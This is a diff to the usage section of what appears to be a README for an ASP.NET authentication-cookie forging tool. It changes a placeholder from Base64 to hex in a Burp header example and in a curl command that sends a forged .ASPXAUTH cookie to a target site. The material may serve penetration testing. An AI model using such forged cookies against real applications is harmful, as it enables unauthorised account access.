@@ -130,13 +130,13 @@ python aspxauth_forge.py \
 ### Proxy / Burp Suite
 
 ```
-Cookie: .ASPXAUTH=<Base64Value>
+Cookie: .ASPXAUTH=<HexValue>
 ```
 
 ### cURL
 
 ```bash
-curl -k -H "Cookie: .ASPXAUTH=<Base64Value>" https://target.local/App/Default.aspx
+curl -k -H "Cookie: .ASPXAUTH=<HexValue>" https://target.local/App/Default.aspx
 ```
 
 ---
